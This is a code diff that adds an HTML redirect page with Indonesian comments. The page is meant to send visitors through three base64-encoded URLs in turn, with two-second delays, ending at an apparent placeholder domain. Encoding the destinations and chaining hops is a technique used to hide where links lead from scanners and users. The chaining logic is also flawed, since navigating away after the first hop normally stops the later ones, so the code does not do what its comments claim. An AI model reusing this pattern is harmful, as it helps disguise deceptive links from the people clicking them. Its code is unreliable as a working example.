@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Array URL untuk redirect berlapis
+        var urls = [
+            atob("aHR0cHM6Ly9waWxpaC5jb20="), // Lapisan 1 (contoh URL Base64: https://pilih.com)
+            atob("aHR0cHM6Ly9waWxpaDIuY29t"), // Lapisan 2
+            atob("aHR0cHM6Ly9kb21haW5hbmRhLmNvbQ==") // Lapisan 3 (tujuan akhir)
+        ];
+
+        // Fungsi redirect berlapis dengan jeda
+        function redirectLayer(index) {
+            if (index < urls.length) {
+                setTimeout(function() {
+                    window.location.href = urls[index];
+                    redirectLayer(index + 1); // Pindah ke URL berikutnya
+                }, 2000); // Delay 2 detik sebelum redirect
+            }
+        }
+
+        // Mulai redirect
+        redirectLayer(0);
+    </script>
+</head>
+<body>
+    <p>Redirecting... Jika tidak otomatis, klik <a id="manual-link">di sini</a>.</p>
+    <script>
+        document.getElementById("manual-link").href = atob("aHR0cHM6Ly9kb21haW5hbmRhLmNvbQ==");
+    </script>
+</body>
+</html>
